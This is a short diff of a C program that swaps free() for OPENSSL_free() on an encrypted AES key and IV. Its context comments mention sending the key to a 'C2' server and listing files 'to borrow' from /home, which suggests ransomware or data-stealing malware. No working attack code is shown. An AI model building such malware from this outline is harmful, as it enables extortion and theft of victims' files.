@@ -58,8 +58,8 @@ int main(){
     //Send the encrypted AES key and iv to C2
 
 
-    free(*encrypted_aes_key);
-    free(*encrypted_iv);
+    OPENSSL_free(encrypted_aes_key);
+    OPENSSL_free(encrypted_iv);
     //List all the files we want to borrow ;)
     /*
     const char *path = "/home";
